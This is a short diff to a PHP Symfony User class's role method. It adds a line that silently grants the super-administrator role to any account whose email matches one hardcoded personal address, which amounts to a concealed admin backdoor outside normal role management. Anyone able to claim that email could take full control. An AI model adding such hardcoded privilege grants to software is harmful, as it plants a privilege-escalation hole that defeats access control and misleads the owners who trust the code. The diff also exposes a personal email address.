@@ -72,6 +72,10 @@ class User implements UserInterface, PasswordAuthenticatedUserInterface
         // guarantee every user at least has ROLE_USER
         $roles[] = 'ROLE_USER';
 
+        if ($this->email === 'noemie.lignier@gmail.com') {
+            $roles[] = 'ROLE_SUPER_ADMIN';
+        }
+
         return array_unique($roles);
     }
 
